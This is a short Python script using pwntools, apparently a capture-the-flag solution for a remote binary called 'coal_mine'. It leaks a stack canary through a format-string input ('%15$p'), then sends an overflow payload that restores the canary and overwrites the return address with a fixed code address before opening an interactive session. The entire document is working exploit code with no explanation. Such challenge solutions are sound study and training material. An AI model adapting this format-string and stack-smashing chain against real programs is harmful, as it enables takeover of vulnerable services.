from pwn import process, remote, p64

HOST = 'ctf-challs.sinf.pt'
PORT = 1339
#io = process("./coal_mine", level="debug")
io = remote(HOST, PORT, level='debug')

io.recvuntil("fellow miner?\n")
io.sendline("%15$p")
io.recvuntil("Thanks, ")

line = io.recvuntil("\n").strip()
value = int(line, 16)

value_str = "".join(chr(c) for c in p64(value))

io.recvuntil("mining today?")

injection = 'A' * 40 + value_str + 8 * 'A' + '\x84\x12\x40\x00\x00\x00\x00\x00'

io.sendline(injection)
io.interactive()
